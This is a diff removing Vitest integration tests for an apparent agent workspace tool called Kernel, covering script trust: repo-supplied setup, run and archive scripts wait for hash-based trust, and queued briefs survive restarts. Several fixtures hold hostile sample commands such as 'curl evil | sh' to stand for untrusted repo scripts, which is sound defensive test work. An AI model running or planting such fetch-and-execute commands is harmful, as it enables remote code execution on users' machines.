-  it('keeps the brief of a workspace waiting for trust across a restart', async () => {
-    const repo = await clonedRepo()
-    const first = await kernelFor(repo)
-    const ws = await first.k.createWorkspace(first.project.id, { prompt: 'Build the table', agentId: 'kai', title: 'Table' })
-    expect(ws.status).toBe('trust')
-    const chat = first.k.store.chats(ws.id).find((c) => c.kind !== 'terminal')!
-    await first.k.stop()
-
-    const again = await kernelFor(repo, first.dataDir)
-    expect(again.k.store.workspace(ws.id)?.status).toBe('trust')
-    expect(again.k.sessions.queued(chat.id).map((q) => q.parts)).toEqual([[{ type: 'text', text: 'Build the table' }]])
-    const trust = (await again.h['projects.scriptTrust']({ projectId: again.project.id }))!
-    expect(trust.workspaceIds).toEqual([ws.id])
-    await again.h['projects.trust']({ projectId: again.project.id, hash: trust.hash })
-    await vi.waitFor(() => expect(again.k.store.workspace(ws.id)?.status).toBe('ready'), { timeout: 15000 })
-    expect(again.released).toEqual([chat.id])
-    await again.k.stop()
-  }, 60000)
-
-  it('keeps the brief when Kernel quits during the setup trusting started, and sends it once Run again passes', async () => {
-    const repo = await clonedRepo()
-    await writeFile(join(repo, '.kernel', 'settings.toml'), '[scripts]\nsetup = "test -f ok.txt || sleep 30"\n')
-    const first = await kernelFor(repo)
-    const ws = await first.k.createWorkspace(first.project.id, { prompt: 'Build the table', agentId: 'kai', title: 'Table' })
-    const chat = first.k.store.chats(ws.id).find((c) => c.kind !== 'terminal')!
-    const { hash } = (await first.h['projects.scriptTrust']({ projectId: first.project.id }))!
-    await first.h['projects.trust']({ projectId: first.project.id, hash })
-    // Setup runs, and Kernel quits before it ends.
-    await vi.waitFor(() => expect(first.k.store.workspace(ws.id)?.status).toBe('setup'))
-    await first.k.stop()
-
-    const again = await kernelFor(repo, first.dataDir)
-    expect(again.k.store.workspace(ws.id)?.status).toBe('failed')
-    expect(again.k.sessions.queued(chat.id).map((q) => q.parts)).toEqual([[{ type: 'text', text: 'Build the table' }]])
-    const sentOnRelease: unknown[] = []
-    again.k.sessions.release = (chatId) => { sentOnRelease.push(again.k.sessions.queued(chatId).map((q) => q.parts)) }
-    await writeFile(join(ws.path, 'ok.txt'), '')
-    await again.h['scripts.run']({ workspaceId: ws.id, kind: 'setup' })
-    await vi.waitFor(() => expect(again.k.store.workspace(ws.id)?.status).toBe('ready'), { timeout: 15000 })
-    expect(sentOnRelease).toEqual([[[{ type: 'text', text: 'Build the table' }]]])
-    await again.k.stop()
-  }, 60000)
-
-  it('keeps a trusted workspace that waits for a PR waiting, and never reruns changed setup text untrusted (KERNEL-259)', async () => {
-    const repo = await clonedRepo()
-    await writeFile(join(repo, '.kernel', 'settings.toml'), '[scripts]\nsetup = "echo first > ran.txt"\n')
-    const { k, project, h, released } = await kernelFor(repo)
-    const first = await k.createWorkspace(project.id, { prompt: 'Build the API', agentId: 'kai', title: 'API' })
-    const waiter = await k.createWorkspace(project.id, { prompt: 'Build the UI on it', agentId: 'kai', title: 'UI', waitFor: [first.id] })
-    expect([first.status, waiter.status]).toEqual(['trust', 'trust'])
-    const chat = k.store.chats(waiter.id).find((c) => c.kind !== 'terminal')!
-
-    await h['projects.trust']({ projectId: project.id, hash: (await h['projects.scriptTrust']({ projectId: project.id }))!.hash })
-    await vi.waitFor(() => expect(k.store.workspace(waiter.id)?.status).toBe('ready'), { timeout: 15000 })
-    // Set up, and still waiting for the API to merge: its brief stays held.
-    expect(await readFile(join(waiter.path, 'ran.txt'), 'utf8')).toBe('first\n')
-    expect(k.store.workspace(waiter.id)?.waitsFor?.held).toBe(true)
-    expect(k.sessions.queued(chat.id).map((q) => q.parts)).toEqual([[{ type: 'text', text: 'Build the UI on it' }]])
-    expect(released).not.toContain(chat.id)
-
-    // A pull changes setup while it waits. When the merge would rerun setup, the new text waits for trust instead.
-    await writeFile(join(repo, '.kernel', 'settings.toml'), '[scripts]\nsetup = "echo changed > ran.txt"\n')
-    const held = await k.setup['startBrief'](k.store.workspace(waiter.id)!, project, chat, { setup: true, released: k.store.workspace(waiter.id)?.waitsFor })
-    expect(held.status).toBe('trust')
-    expect(await readFile(join(waiter.path, 'ran.txt'), 'utf8')).toBe('first\n')
-    expect(released).not.toContain(chat.id)
-    await k.stop()
-  }, 60000)
-
-  it('covers named run scripts: in the hash, in what the user reads, and before Run starts one (KERNEL-244)', async () => {
-    const repo = await clonedRepo()
-    const marker = join(await mkdtemp(join(tmpdir(), 'kernel-marker-')), 'web')
-    await writeFile(join(repo, '.kernel', 'settings.toml'), `[scripts]\nsetup = "true"\n\n[run_scripts]\nweb = "touch ${marker}"\n`)
-    // The user's own named script needs no trusting.
-    await writeFile(join(repo, '.kernel', 'settings.local.toml'), '[run_scripts]\napi = "pnpm api"\n')
-    const { k, project, h } = await kernelFor(repo)
-    const trust = (await h['projects.scriptTrust']({ projectId: project.id }))!
-    expect(trust.runScripts).toEqual([{ name: 'web', command: `touch ${marker}` }])
-    const ws = await k.createWorkspace(project.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })
-    expect(ws.status).toBe('trust')
-    // The Run tab can't start it either.
-    await expect(h['scripts.run']({ workspaceId: ws.id, kind: 'run', name: 'web' })).rejects.toThrow('Trust this project')
-    await expect(stat(marker)).rejects.toThrow()
-
-    // Changed text is new text.
-    await writeFile(join(repo, '.kernel', 'settings.toml'), `[scripts]\nsetup = "true"\n\n[run_scripts]\nweb = "touch ${marker} && curl evil"\n`)
-    const changed = (await h['projects.scriptTrust']({ projectId: project.id }))!
-    expect(changed.hash).not.toBe(trust.hash)
-    await h['projects.trust']({ projectId: project.id, hash: changed.hash })
-    await vi.waitFor(() => expect(k.store.workspace(ws.id)?.status).toBe('ready'), { timeout: 15000 })
-    await writeFile(join(repo, '.kernel', 'settings.toml'), `[scripts]\nsetup = "true"\n\n[run_scripts]\nweb = "touch ${marker}"\n`)
-    // Going back to the first text asks too: the user read it but never trusted it.
-    await expect(h['scripts.run']({ workspaceId: ws.id, kind: 'run', name: 'web' })).rejects.toThrow('Trust this project')
-    await h['projects.trust']({ projectId: project.id, hash: trust.hash })
-    await h['scripts.run']({ workspaceId: ws.id, kind: 'run', name: 'web' })
-    await vi.waitFor(() => expect(stat(marker)).resolves.toBeTruthy(), { timeout: 15000 })
-    await k.stop()
-  }, 60000)
-
-  it('archives a waiting workspace without running its archive script', async () => {
-    const repo = await clonedRepo()
-    const marker = join(await mkdtemp(join(tmpdir(), 'kernel-marker-')), 'archived')
-    await writeFile(join(repo, '.kernel', 'settings.toml'), `[scripts]\nsetup = "true"\narchive = "touch ${marker}"\n`)
-    const { k, project } = await kernelFor(repo)
-    const lines: string[] = []
-    const on = (e: PushEvent) => { if (e.type === 'script.output' && e.kind === 'archive') lines.push(...e.lines.map((l) => l.line)) }
-    bus.on('push', on)
-    const ws = await k.createWorkspace(project.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })
-    await k.archiveWorkspace(ws.id)
-    await k.archive.cleanedUp(ws.id)
-    bus.off('push', on)
-    expect(k.store.workspace(ws.id)?.status).toBe('archived')
-    await expect(stat(marker)).rejects.toThrow()
-    expect(lines).toEqual(["Skipped the archive script: this project's scripts aren't trusted yet."])
-    await k.stop()
-  }, 60000)
-
-  it("asks nothing about the settings.toml Kernel writes for a new project, and asks about one the repo brought alongside it", async () => {
-    const agents = {
-      '.claude/agents/kernel.md': '---\nname: kernel\ndescription: Lead.\nlead: true\n---\nYou are Kernel.',
-      '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.'
-    }
-    const setUp = async (files: Record<string, string>, before?: (repo: string) => Promise<void>) => {
-      const repo = await tempRepo({ 'README.md': '# x\n', 'pnpm-lock.yaml': '', ...agents, ...files })
-      // Already installed, so the project's install step runs nothing.
-      await mkdir(join(repo, 'node_modules'))
-      await before?.(repo)
-      const { k, h } = await kernelFor(await tempRepo())
-      const steps: string[][] = []
-      const on = (e: PushEvent) => { if (e.type === 'project.setup') steps.push(e.steps.map((x) => x.state)) }
-      bus.on('push', on)
-      const project = await k.createProject({ source: 'folder', name: 'Own app', from: repo, team: [], autostart: false })
-      await vi.waitFor(() => expect(steps.at(-1)?.every((x) => x === 'ok' || x === 'fail')).toBe(true), { timeout: 15000 })
-      bus.off('push', on)
-      const trust = await h['projects.scriptTrust']({ projectId: project.id })
-      await k.stop()
-      return { repo, trust }
-    }
-    // The file Kernel writes sets no script, so the project has nothing to ask about (KERNEL-682).
-    const own = await setUp({})
-    expect((await loadRepoSettings(own.repo)).scripts).toEqual({})
-    expect(own.trust).toBeNull()
-    // A committed settings.local.toml is the repo's text, merged in, so the project asks.
-    const brought = await setUp({ '.kernel/settings.local.toml': '[scripts]\nrun = "curl evil | sh"\n' })
-    expect(brought.trust!.scripts).toEqual({ run: 'curl evil | sh' })
-    // The same file committed in another case. A case-insensitive disk reads it as the personal file, and then the project asks.
-    const cased = await setUp({ '.Kernel/Settings.local.toml': '[scripts]\nrun = "curl evil | sh"\n' })
-    if (await stat(join(cased.repo, '.kernel', 'settings.local.toml')).then(() => true, () => false)) expect(cased.trust!.scripts).toEqual({ run: 'curl evil | sh' })
-    else expect(cased.trust).toBeNull()
-  }, 90000)
 })
